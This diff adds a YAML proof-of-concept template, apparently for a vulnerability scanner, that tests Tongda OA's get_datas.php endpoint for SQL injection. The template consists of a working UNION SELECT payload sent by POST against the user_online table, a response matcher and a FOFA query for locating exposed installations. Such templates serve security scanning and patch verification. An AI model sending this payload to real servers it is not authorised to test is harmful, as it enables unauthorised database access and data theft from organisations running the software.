@@ -1,0 +1,27 @@
+id: poc-yaml-tongda-oa-get-datas-php-sqli
+info:
+  name: 通达OA get_datas.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+variables:
+  t1: random_int(100,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /general/reportshop/utils/get_datas.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 where 1={`\='` 1} union (select
+    uid,md5({{.t1}}) from user_online where 1\={`=` 1})-- '1
+  expression: 'status_code == 200 &&
+
+    contains(body,t2) &&
+
+    contains(headers,"charset=gbk")
+
+    '
+transport: http
